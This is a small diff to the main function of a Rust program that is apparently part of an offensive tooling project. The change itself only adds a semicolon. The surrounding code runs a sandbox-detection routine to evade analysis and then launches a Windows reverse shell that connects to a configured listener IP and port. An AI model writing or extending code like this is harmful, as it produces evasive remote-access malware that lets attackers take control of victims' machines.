@@ -17,7 +17,7 @@ use rco_reverse_shell_windows_antistring::shell;
 fn main() {
     // Runs the sandbox detection function or the dummy replacement, dependent on features
     if rco_utils::pound_sand() {
-        return
+        return;
     }
 
     shell(rco_config::LISTENER_IP, rco_config::LISTENER_PORT);
